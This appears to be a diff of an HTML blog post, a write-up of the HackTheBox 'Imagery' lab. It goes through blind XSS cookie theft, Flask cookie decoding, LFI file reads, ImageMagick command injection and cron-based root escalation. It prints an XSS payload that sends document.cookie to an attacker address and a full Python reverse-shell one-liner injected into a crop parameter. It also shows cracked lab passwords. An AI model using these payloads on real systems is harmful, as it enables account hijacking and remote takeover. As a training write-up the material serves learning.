@@ -1,47 +1,56 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <meta name="description" content="Writeup complet de la box HackTheBox Imagery : XSS aveugle, cookie Flask, LFI, injection ImageMagick et escalade root.">
-    <meta name="author" content="Shaadi">
-    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
-    <meta name="keywords" content="HackTheBox, Imagery, writeup, XSS, LFI, command injection, privilege escalation, Sh44di">
-    <meta name="theme-color" content="#1d1f21">
-    
-    <!-- Security Headers -->
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';">
-    <meta http-equiv="X-Content-Type-Options" content="nosniff">
-    <meta http-equiv="X-Frame-Options" content="DENY">
-    <meta http-equiv="Referrer-Policy" content="no-referrer">
-    
-    <link rel="canonical" href="https://sh44di.me/posts/Imagery.html">
-    <link rel="icon" type="image/png" href="../spectrum.png">
-    <title>Imagery - HackTheBox | Shaadi (Adam Benaissa)</title>
-    <link rel="stylesheet" href="../styles.css">
-    <link rel="stylesheet" href="post.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description"
+    content="HackTheBox Imagery writeup by Shaadi (Adam Benaïssa / Sh44di) — blind XSS, Flask cookie, LFI, ImageMagick command injection and root escalation via cron.">
+  <meta name="author" content="Adam Benaïssa">
+  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+  <meta name="keywords"
+    content="HackTheBox, Imagery, writeup, XSS, LFI, command injection, privilege escalation, Sh44di, Shaadi, infosec">
+  <meta name="theme-color" content="#1d1f21">
 
-    <!-- Open Graph -->
-    <meta property="og:type" content="article">
-    <meta property="og:site_name" content="Shaadi">
-    <meta property="og:title" content="Imagery - HackTheBox | Shaadi (Adam Benaissa)">
-    <meta property="og:description" content="Exploit de la box Imagery : XSS, LFI, injection ImageMagick et escalade root.">
-    <meta property="og:url" content="https://sh44di.me/posts/Imagery.html">
-    <meta property="og:image" content="https://sh44di.me/spectrum.jpg">
-    <meta property="og:locale" content="fr_FR">
-    <meta property="article:published_time" content="2026-01-24">
-    <meta property="article:modified_time" content="2026-01-24">
-    <meta property="article:author" content="https://sh44di.me/#person">
+  <!-- Security Headers -->
+  <meta http-equiv="Content-Security-Policy"
+    content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';">
 
-    <!-- Twitter -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Imagery - HackTheBox | Shaadi (Adam Benaissa)">
-    <meta name="twitter:description" content="Exploit de la box Imagery : XSS, LFI, injection ImageMagick et escalade root.">
-    <meta name="twitter:image" content="https://sh44di.me/spectrum.jpg">
+  <link rel="preload" href="../styles.css" as="style">
+  <link rel="preload" href="post.css" as="style">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="X-Frame-Options" content="DENY">
+  <meta http-equiv="Referrer-Policy" content="no-referrer">
 
-    <!-- Structured Data -->
-    <script type="application/ld+json">
+  <link rel="canonical" href="https://sh44di.me/posts/Imagery.html">
+  <link rel="icon" type="image/png" href="../spectrum.png">
+  <title>Imagery - HackTheBox | Shaadi (Adam Benaissa)</title>
+  <link rel="stylesheet" href="../styles.css">
+  <link rel="stylesheet" href="post.css">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Shaadi">
+  <meta property="og:title" content="Imagery - HackTheBox | Shaadi (Adam Benaïssa / Sh44di)">
+  <meta property="og:description"
+    content="HackTheBox Imagery writeup by Shaadi — blind XSS, Flask cookie, LFI, ImageMagick command injection and root escalation via cron.">
+  <meta property="og:url" content="https://sh44di.me/posts/Imagery.html">
+  <meta property="og:image" content="https://sh44di.me/spectrum.jpg">
+  <meta property="og:locale" content="en_US">
+  <meta property="article:published_time" content="2026-01-24">
+  <meta property="article:modified_time" content="2026-01-24">
+  <meta property="article:author" content="https://sh44di.me/#person">
+
+  <!-- Twitter -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Imagery - HackTheBox | Shaadi (Adam Benaïssa / Sh44di)">
+  <meta name="twitter:description"
+    content="HackTheBox Imagery writeup by Shaadi — blind XSS, Flask cookie, LFI, ImageMagick command injection and root escalation via cron.">
+  <meta name="twitter:image" content="https://sh44di.me/spectrum.jpg">
+
+  <!-- Structured Data -->
+  <script type="application/ld+json">
     {
       "@context": "https://schema.org",
       "@graph": [
@@ -67,41 +76,41 @@
           "@type": "WebSite",
           "@id": "https://sh44di.me/#website",
           "url": "https://sh44di.me/",
-          "name": "Shaadi | Adam Benaissa",
+          "name": "Shaadi — Infosec Blog",
           "alternateName": "Sh44di blog",
           "publisher": { "@id": "https://sh44di.me/#person" },
-          "inLanguage": "fr-FR"
+          "inLanguage": "en-US"
         },
         {
           "@type": "WebPage",
           "@id": "https://sh44di.me/posts/Imagery.html#webpage",
           "url": "https://sh44di.me/posts/Imagery.html",
-          "name": "Imagery - HackTheBox | Shaadi (Adam Benaissa)",
+          "name": "Imagery - HackTheBox | Shaadi (Adam Benaïssa / Sh44di)",
           "isPartOf": { "@id": "https://sh44di.me/#website" },
           "about": { "@id": "https://sh44di.me/#person" },
           "datePublished": "2026-01-24",
           "dateModified": "2026-01-24",
-          "inLanguage": "fr-FR"
+          "inLanguage": "en-US"
         },
         {
           "@type": "BlogPosting",
           "headline": "Imagery - HackTheBox",
-          "description": "Exploit complet de la box Imagery : XSS, LFI, injection ImageMagick et escalade root.",
+          "description": "HackTheBox Imagery writeup: blind XSS, Flask cookie theft, LFI, ImageMagick command injection and root escalation via cron.",
           "author": { "@id": "https://sh44di.me/#person" },
           "publisher": { "@id": "https://sh44di.me/#person" },
           "mainEntityOfPage": { "@id": "https://sh44di.me/posts/Imagery.html#webpage" },
           "image": "https://sh44di.me/spectrum.jpg",
           "datePublished": "2026-01-24",
           "dateModified": "2026-01-24",
-          "keywords": ["HackTheBox", "Imagery", "XSS", "LFI", "command injection", "writeup"],
-          "inLanguage": "fr-FR",
+          "keywords": ["HackTheBox", "Imagery", "XSS", "LFI", "command injection", "writeup", "infosec"],
+          "inLanguage": "en-US",
           "@id": "https://sh44di.me/posts/Imagery.html#post"
         },
         {
           "@type": "BreadcrumbList",
           "@id": "https://sh44di.me/posts/Imagery.html#breadcrumb",
           "itemListElement": [
-            { "@type": "ListItem", "position": 1, "name": "Accueil", "item": "https://sh44di.me/" },
+            { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://sh44di.me/" },
             { "@type": "ListItem", "position": 2, "name": "Writeups", "item": "https://sh44di.me/pages/writeups.html" },
             { "@type": "ListItem", "position": 3, "name": "Imagery", "item": "https://sh44di.me/posts/Imagery.html" }
           ]
@@ -110,41 +119,44 @@
     }
     </script>
 </head>
+
 <body>
-    <!-- Navigation -->
-    <nav class="navbar">
-        <div class="nav-container">
-            <a href="../index.html" class="nav-brand"> &gt; Shaadi<span class="cursor-blink">▐</span></a>
-            <div class="nav-menu">
-                <a href="../pages/whoami.html" class="nav-link">Whoami</a>
-                <a href="../pages/writeups.html" class="nav-link">My Writeups</a>
-                <a href="../pages/certifications.html" class="nav-link">Certifications</a>
-            </div>
+  <!-- Navigation -->
+  <nav class="navbar">
+    <div class="nav-container">
+      <a href="../index.html" class="nav-brand"> &gt; Shaadi<span class="cursor-blink">▐</span></a>
+      <div class="nav-menu">
+        <a href="../pages/whoami.html" class="nav-link">Whoami</a>
+        <a href="../pages/writeups.html" class="nav-link">My Writeups</a>
+        <a href="../pages/certifications.html" class="nav-link">Certifications</a>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Post Content -->
+  <article class="post-content">
+    <div class="container">
+      <header class="post-header">
+        <h1 class="post-title-main">Imagery - HackTheBox</h1>
+        <div class="post-meta">
+          <span class="post-date-full">January 24, 2026</span>
+          <span class="post-separator">•</span>
+          <span class="post-platform">HackTheBox</span>
+          <span class="post-separator">•</span>
+          <span class="post-difficulty medium">Medium</span>
+          <span class="lang-flag" title="English">🇬🇧</span>
         </div>
-    </nav>
+      </header>
 
-    <!-- Post Content -->
-    <article class="post-content">
-        <div class="container">
-            <header class="post-header">
-                <h1 class="post-title-main">Imagery - HackTheBox</h1>
-                <div class="post-meta">
-                    <span class="post-date-full">January 24, 2026</span>
-                    <span class="post-separator">•</span>
-                    <span class="post-platform">HackTheBox</span>
-                    <span class="post-separator">•</span>
-                    <span class="post-difficulty medium">Medium</span>
-                    <span class="lang-flag" title="English">🇬🇧</span>
-                </div>
-            </header>
+      <div class="post-body">
+        <section class="post-section">
 
-            <div class="post-body">
-                <section class="post-section">
-                    
-<p>In this walkthrough, I demonstrate how I obtained complete ownership of Imagery on HackTheBox
-<img alt="" src="../writeups/Imagery_writeup/screen_box_pwned.png" /></p>
-<h2>Nmap results</h2>
-<div class="code-block"><pre><code>~ ❯ nmap 10.10.11.88
+          <p>In this walkthrough, I demonstrate how I obtained complete ownership of Imagery on HackTheBox
+            <img alt="" src="../writeups/Imagery_writeup/screen_box_pwned.png" />
+          </p>
+          <h2>Nmap results</h2>
+          <div class="code-block">
+            <pre><code>~ ❯ nmap 10.10.11.88
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-26 09:00 CET
 Nmap scan report for 10.10.11.88
 Host is up (0.12s latency).
@@ -154,20 +166,27 @@ PORT     STATE    SERVICE
 8000/tcp open     http-alt
 
 Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
-</code></pre></div>
-<p>The nmap scan reveals an open HTTP server on port 8000, which hosts the main web application.</p>
-<h2>Initial jnteraction with the site</h2>
-<p><img alt="" src="../writeups/Imagery_writeup/page.png" />
-I go to http://imagery.htb:8000 and arrive at a webpage that serves as an online photo gallery. I create an account.</p>
-<p><img alt="" src="../writeups/Imagery_writeup/upload.png" />
-Once logged in, I can only import images. I can also view my gallery containing all the images I have imported.</p>
-<p><img alt="" src="../writeups/Imagery_writeup/no_perms_gallery.png" />
-In the "Gallery" section, we notice that there are several features that are not accessible to users. When we click on them, a message appears on the page: "Feature still in production."</p>
-<p><img alt="" src="../writeups/Imagery_writeup/report.png" />
-We also see a "report bug" page; when we send a message, we receive this message: "Bug report submitted. Admin review in progress." Let's keep this page handy.</p>
-<h2>source code analysis</h2>
-<p>Analyzing the source code reveals that an "isTestuser" feature allows you to have all the permissions that you do not have as a user on the gallery.</p>
-<div class="code-block"><pre><code>let loggedInUserIsTestUser = false;
+</code></pre>
+          </div>
+          <p>The nmap scan reveals an open HTTP server on port 8000, which hosts the main web application.</p>
+          <h2>Initial jnteraction with the site</h2>
+          <p><img alt="" src="../writeups/Imagery_writeup/page.png" />
+            I go to http://imagery.htb:8000 and arrive at a webpage that serves as an online photo gallery. I create an
+            account.</p>
+          <p><img alt="" src="../writeups/Imagery_writeup/upload.png" />
+            Once logged in, I can only import images. I can also view my gallery containing all the images I have
+            imported.</p>
+          <p><img alt="" src="../writeups/Imagery_writeup/no_perms_gallery.png" />
+            In the "Gallery" section, we notice that there are several features that are not accessible to users. When
+            we click on them, a message appears on the page: "Feature still in production."</p>
+          <p><img alt="" src="../writeups/Imagery_writeup/report.png" />
+            We also see a "report bug" page; when we send a message, we receive this message: "Bug report submitted.
+            Admin review in progress." Let's keep this page handy.</p>
+          <h2>source code analysis</h2>
+          <p>Analyzing the source code reveals that an "isTestuser" feature allows you to have all the permissions that
+            you do not have as a user on the gallery.</p>
+          <div class="code-block">
+            <pre><code>let loggedInUserIsTestUser = false;
 
 function handleConvertImage(imageId) {
     if (!loggedInUserIsTestUser) {  // ← BLOCAGE ICI
@@ -192,40 +211,57 @@ function handleMetadataDeletion(imageId) {
     }
 ...
 }
-</code></pre></div>
-<p>We also note that the source code contains many web application endpoints, in particular</p>
-<div class="code-block"><pre><code>window.location.href = `/admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log`;
-</code></pre></div>
-<p>but when you visit the page:
-<img alt="" src="../writeups/Imagery_writeup/refused.png" /></p>
-<p>We notice that the session cookie is  signed in Flask, so we have a Flask application. I use Flask unsign to to read its content.</p>
-<div class="code-block"><pre><code>~ ❯ flask-unsign --decode --cookie &quot;.eJxNjTEOg0AMBP_iGkUKBQVVKPOK03JnwNLZh_BRRBF_TyiIUs7MSvumJL5mvJ6JekI33uPUtdSQ-JBUjPoJ2fnkILry5sVQxeZQ2evuvP0vLhcQY9mt_topDcrfD1-AJI9ZIfkWi9LxASS-L6s.aScI6Q.oXARj9tBBwOnm9vQxvWsjaam6LU&quot;
+</code></pre>
+          </div>
+          <p>We also note that the source code contains many web application endpoints, in particular</p>
+          <div class="code-block">
+            <pre><code>window.location.href = `/admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log`;
+</code></pre>
+          </div>
+          <p>but when you visit the page:
+            <img alt="" src="../writeups/Imagery_writeup/refused.png" />
+          </p>
+          <p>We notice that the session cookie is signed in Flask, so we have a Flask application. I use Flask unsign to
+            to read its content.</p>
+          <div class="code-block">
+            <pre><code>~ ❯ flask-unsign --decode --cookie &quot;.eJxNjTEOg0AMBP_iGkUKBQVVKPOK03JnwNLZh_BRRBF_TyiIUs7MSvumJL5mvJ6JekI33uPUtdSQ-JBUjPoJ2fnkILry5sVQxeZQ2evuvP0vLhcQY9mt_topDcrfD1-AJI9ZIfkWi9LxASS-L6s.aScI6Q.oXARj9tBBwOnm9vQxvWsjaam6LU&quot;
 {'displayId': 'a6b1cf62', 'isAdmin': False, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'shaadi@test.com'}
-</code></pre></div>
-<p>Note that my account has the attribute 'isAdmin': False ands 'is_testuser_account': False</p>
-<h2>XSS</h2>
-<p>Let's try some blind XSS on the bug report page to try to steal the admin cookie. The htb boxs arent connected to the internet, so we can't use a webhook to retrieve the cookie. Therefore, we'll create a Python script, cookie_stealer.py, which will handle retrieving the administrator cookie.</p>
-<p><img alt="" src="../writeups/Imagery_writeup/screen2.png" />
-We launch the python script, since the page is poorly filtered, after a few attempts we find a working payload:
-<code>&lt;img src=x onerror=&quot;window.location='http://10.10.14.11:8888/?cookie='+document.cookie&quot;&gt;</code></p>
-<div class="code-block"><pre><code>~ ❯ python3 cookie_stealer.py                                                                              
+</code></pre>
+          </div>
+          <p>Note that my account has the attribute 'isAdmin': False ands 'is_testuser_account': False</p>
+          <h2>XSS</h2>
+          <p>Let's try some blind XSS on the bug report page to try to steal the admin cookie. The htb boxs arent
+            connected to the internet, so we can't use a webhook to retrieve the cookie. Therefore, we'll create a
+            Python script, cookie_stealer.py, which will handle retrieving the administrator cookie.</p>
+          <p><img alt="" src="../writeups/Imagery_writeup/screen2.png" />
+            We launch the python script, since the page is poorly filtered, after a few attempts we find a working
+            payload:
+            <code>&lt;img src=x onerror=&quot;window.location='http://10.10.14.11:8888/?cookie='+document.cookie&quot;&gt;</code>
+          </p>
+          <div class="code-block">
+            <pre><code>~ ❯ python3 cookie_stealer.py                                                                              
 Server running on port 8888
 Waiting for requests...
 
 
 [2025-11-26 16:45:19] Cookie received from 10.10.11.88
 session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aScgig.dRV3pMuyzKa95CaUJdstPl-HsbM
-</code></pre></div>
-<p>Then we receive the administrator cookie</p>
-<p>We verify that it is indeed the Admin cookie</p>
-<div class="code-block"><pre><code>~ ❯ flask-unsign --decode --cookie &quot;.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aScgig.dRV3pMuyzKa95CaUJdstPl-HsbM&quot;
+</code></pre>
+          </div>
+          <p>Then we receive the administrator cookie</p>
+          <p>We verify that it is indeed the Admin cookie</p>
+          <div class="code-block">
+            <pre><code>~ ❯ flask-unsign --decode --cookie &quot;.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aScgig.dRV3pMuyzKa95CaUJdstPl-HsbM&quot;
 {'displayId': 'a1b2c3d4', 'isAdmin': True, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'admin@imagery.htb'}
-</code></pre></div>
-<p>isAdmin: True, we got the admin cookie</p>
-<h2>LFI</h2>
-<p>I modify my cookie and access the admin page and the admin panel.
-Remember that earlier we had the endpoint /admin/get_system_log..., let's try a LFI. We know we have a Flask application; generally, the standard main file is app.py.</p>
-<div class="code-block"><pre><code>~ ❯ curl &quot;http://imagery.htb:8000/admin/get_system_log?log_identifier=../app.py&quot; \
+</code></pre>
+          </div>
+          <p>isAdmin: True, we got the admin cookie</p>
+          <h2>LFI</h2>
+          <p>I modify my cookie and access the admin page and the admin panel.
+            Remember that earlier we had the endpoint /admin/get_system_log..., let's try a LFI. We know we have a Flask
+            application; generally, the standard main file is app.py.</p>
+          <div class="code-block">
+            <pre><code>~ ❯ curl &quot;http://imagery.htb:8000/admin/get_system_log?log_identifier=../app.py&quot; \
   -H &quot;Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aScgig.dRV3pMuyzKa95CaUJdstPl-HsbM&quot;
 from flask import Flask, render_template
 import os
@@ -237,9 +273,11 @@ from api_edit import bp_edit
 ...
 OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
 ...
-</code></pre></div>
-<p>We have a config.py and api_edit.py files and several ports are blocked.</p>
-<div class="code-block"><pre><code>~ ❯ curl &quot;http://imagery.htb:8000/admin/get_system_log?log_identifier=../config.py&quot; \
+</code></pre>
+          </div>
+          <p>We have a config.py and api_edit.py files and several ports are blocked.</p>
+          <div class="code-block">
+            <pre><code>~ ❯ curl &quot;http://imagery.htb:8000/admin/get_system_log?log_identifier=../config.py&quot; \
   -H &quot;Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aScgig.dRV3pMuyzKa95CaUJdstPl-HsbM&quot;
 
 import os
@@ -247,9 +285,11 @@ import ipaddress
 
 DATA_STORE_PATH = 'db.json'
 ...
-</code></pre></div>
-<p>In config.py, we find a db.json file.</p>
-<div class="code-block"><pre><code>~ ❯ curl &quot;http://imagery.htb:8000/admin/get_system_log?log_identifier=../db.json&quot; \
+</code></pre>
+          </div>
+          <p>In config.py, we find a db.json file.</p>
+          <div class="code-block">
+            <pre><code>~ ❯ curl &quot;http://imagery.htb:8000/admin/get_system_log?log_identifier=../db.json&quot; \
   -H &quot;Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aScgig.dRV3pMuyzKa95CaUJdstPl-HsbM&quot;
 {
     &quot;users&quot;: [
@@ -277,13 +317,19 @@ DATA_STORE_PATH = 'db.json'
     ]
 ...
 }
-</code></pre></div>
-<p>We have the usernames and passwords for Admin and testUser, we pass the testUser password to https://md5decrypt.net/,
-We get testuser@imagery.htb:iambatman
-<img alt="" src="../writeups/Imagery_writeup/capture3.png" /></p>
-<p>Once logged into the account, in the "Transform image" options, you can see that there is a "crop" function.
-<img alt="" src="../writeups/Imagery_writeup/crop.png" /></p>
-<div class="code-block"><pre><code>~ ❯ curl &quot;http://imagery.htb:8000/admin/get_system_log?log_identifier=../api_edit.py&quot; \
+</code></pre>
+          </div>
+          <p>We have the usernames and passwords for Admin and testUser, we pass the testUser password to
+            https://md5decrypt.net/,
+            We get testuser@imagery.htb:iambatman
+            <img alt="" src="../writeups/Imagery_writeup/capture3.png" />
+          </p>
+          <p>Once logged into the account, in the "Transform image" options, you can see that there is a "crop"
+            function.
+            <img alt="" src="../writeups/Imagery_writeup/crop.png" />
+          </p>
+          <div class="code-block">
+            <pre><code>~ ❯ curl &quot;http://imagery.htb:8000/admin/get_system_log?log_identifier=../api_edit.py&quot; \
 -H &quot;Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aSdYiA.UoVmv4xBevM4CljeXqObx_HEdWM&quot;
 ...
 @bp_edit.route('/apply_visual_transform', methods=['POST'])
@@ -297,11 +343,17 @@ def apply_visual_transform():
             command = f&quot;{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}&quot;
             subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
 
-</code></pre></div>
-<p>In /api_edit.py, we discover that the crop functionality can be used on a shell, provided that we are logged in with the usertest account. We can therefore try to obtain a reverse shell on the machine by using crop</p>
-<h2>Reverse shell</h2>
-<p>I start by retrieving the ID of the image I uploaded earlier in /images. We'll test if our command injection actually works; we'll try to display the contents of /etc/passwd to see all the existing users on the machine and copy it into the upload/passwd.txt file.</p>
-<div class="code-block"><pre><code>~ ❯ curl &quot;http://imagery.htb:8000/apply_visual_transform&quot; \
+</code></pre>
+          </div>
+          <p>In /api_edit.py, we discover that the crop functionality can be used on a shell, provided that we are
+            logged in with the usertest account. We can therefore try to obtain a reverse shell on the machine by using
+            crop</p>
+          <h2>Reverse shell</h2>
+          <p>I start by retrieving the ID of the image I uploaded earlier in /images. We'll test if our command
+            injection actually works; we'll try to display the contents of /etc/passwd to see all the existing users on
+            the machine and copy it into the upload/passwd.txt file.</p>
+          <div class="code-block">
+            <pre><code>~ ❯ curl &quot;http://imagery.htb:8000/apply_visual_transform&quot; \
   -H &quot;Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aSgfWg.EhdL_Ig5AKi2FJsE1_OcyZ_VoXw&quot; \
   -H &quot;Content-Type: application/json&quot; \
   -d '{
@@ -315,17 +367,22 @@ def apply_visual_transform():
     }
   }'
 {&quot;message&quot;:&quot;Image transformed successfully!&quot;,&quot;newImageId&quot;:&quot;49721b0e-b868-4935-a185-6779016724c9&quot;,&quot;newImageUrl&quot;:&quot;/uploads/admin/transformed/transformed_1894bca5-afdb-4160-93db-fa74dbce3a2f.png&quot;,&quot;success&quot;:true}
-</code></pre></div>
-<div class="code-block"><pre><code>~ ❯ curl &quot;http://imagery.htb:8000/admin/get_system_log?log_identifier=../uploads/passwd.txt&quot; \
+</code></pre>
+          </div>
+          <div class="code-block">
+            <pre><code>~ ❯ curl &quot;http://imagery.htb:8000/admin/get_system_log?log_identifier=../uploads/passwd.txt&quot; \
   -H &quot;Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aSggOA.ziq5kmtcGFj5GDEaAX5fc6-LNrw&quot;
 root:x:0:0:root:/root:/bin/bash
 ...
 web:x:1001:1001::/home/web:/bin/bash
 mark:x:1002:1002::/home/mark:/bin/bash
-</code></pre></div>
-<p>We notice two interesting users: web, where we are currently located, and mark, probably the user for SSH into the machine</p>
-<p>Now we know that our command injection works, let's list the tools installed on the machine.</p>
-<div class="code-block"><pre><code>~ ❯ curl &quot;http://imagery.htb:8000/apply_visual_transform&quot; \                                                   
+</code></pre>
+          </div>
+          <p>We notice two interesting users: web, where we are currently located, and mark, probably the user for SSH
+            into the machine</p>
+          <p>Now we know that our command injection works, let's list the tools installed on the machine.</p>
+          <div class="code-block">
+            <pre><code>~ ❯ curl &quot;http://imagery.htb:8000/apply_visual_transform&quot; \                                                   
   -H &quot;Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aSgfWg.EhdL_Ig5AKi2FJsE1_OcyZ_VoXw&quot; \
   -H &quot;Content-Type: application/json&quot; \
   -d '{
@@ -347,9 +404,12 @@ mark:x:1002:1002::/home/mark:/bin/bash
 /usr/bin/nc
 /usr/bin/bash
 /usr/bin/sh
-</code></pre></div>
-<p>I see here that Python is installed, so I can definitely do a reverse shell in Python. I'll use port 443 because we noticed earlier that it wasn't one of the blocked ports in app.py</p>
-<div class="code-block"><pre><code>curl &quot;http://imagery.htb:8000/apply_visual_transform&quot; \
+</code></pre>
+          </div>
+          <p>I see here that Python is installed, so I can definitely do a reverse shell in Python. I'll use port 443
+            because we noticed earlier that it wasn't one of the blocked ports in app.py</p>
+          <div class="code-block">
+            <pre><code>curl &quot;http://imagery.htb:8000/apply_visual_transform&quot; \
   -H &quot;Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aSrOgA.AQVIJTLKfgl_obAjYQdudgfEHL8&quot; \
   -H &quot;Content-Type: application/json&quot; \
   -d '{
@@ -362,58 +422,80 @@ mark:x:1002:1002::/home/mark:/bin/bash
       &quot;height&quot;: &quot;100;python3 -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.11\&quot;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;])'\'' #&quot;
     }
   }'
-</code></pre></div>
-<p>In parallel, we launch our netcat</p>
-<p><img alt="" src="../writeups/Imagery_writeup/revshell.png" />
-I finally have my revshell; now I need Mark's SSH password. During my research, I noticed that the SSH connection for the user Mark uses a public key. Therefore, I will need to find Mark's password and connect from my revshell.</p>
-<p><img alt="" src="../writeups/Imagery_writeup/ssh.png" /></p>
-<h2>Backup decryption</h2>
-<p>I started by launching linepeas on the revshell, and there I noticed a backup file in /var/backup/web_20250806_120723.zip.aes, It is zipped and encrypted with AES.
-<img alt="" src="../writeups/Imagery_writeup/linepeas.png" />
-<img alt="" src="../writeups/Imagery_writeup/web_zip_aes.png" /></p>
-<p>A little further on I see that a user used PyAesCrypt to encrypt the backup file.
-<img alt="" src="../writeups/Imagery_writeup/pyaescrypt.png" /></p>
-<p>I extract the backup to my laptop and decrypt it with a Python script found on GitHub: https://github.com/Nabeelcn25/dpyAesCrypt.py
-<img alt="" src="../writeups/Imagery_writeup/dechiffrement.png" /></p>
-<p>In the unzipped backup there is a db.json file, inside which is the password of mark
-<img alt="" src="../writeups/Imagery_writeup/db.png" /></p>
-<p>Using md5 decryption, we can find the real password for mark:supersmash, I log into Mark's account and retrieve the user flag.
-<img alt="" src="../writeups/Imagery_writeup/su_mark.png" />
-<img alt="" src="../writeups/Imagery_writeup/user.png" /></p>
-<h2>Privilege escalation</h2>
-<p>with a simple sudo -l I see that we can run charcol as sudo without needing the password; that's probably where we'll be able to do our privilege escalation.
-<img alt="" src="../writeups/Imagery_writeup/sudo_l.png" /></p>
-<p><img alt="" src="../writeups/Imagery_writeup/sudoL.png" /></p>
-<p>When I launch Charcol, I realize it's a backup tool. I notice there's user documentation available.
-<img alt="" src="../writeups/Imagery_writeup/help.png" />
-The help reveals that I can reset charcol's password with mark's password</p>
-<p>I reset the password and launched the charcol shell
-<img alt="" src="../writeups/Imagery_writeup/reset.png" /></p>
-<p>I consult the shell help documentation
-<img alt="" src="../writeups/Imagery_writeup/aide.png" />
-Help shows all commands available in the shell. I noticed that you can add tasks to cron as root (because you're using sudo) to automate tasks. However, in my case, I can use it to force the root account to open a TCP connection to a netcat instance that I've launched locally, because thanks to <code>--command</code> I can enter bash commands. In short, I can have a <strong>root revshell</strong>.</p>
-<p><img alt="" src="../writeups/Imagery_writeup/command.png" />
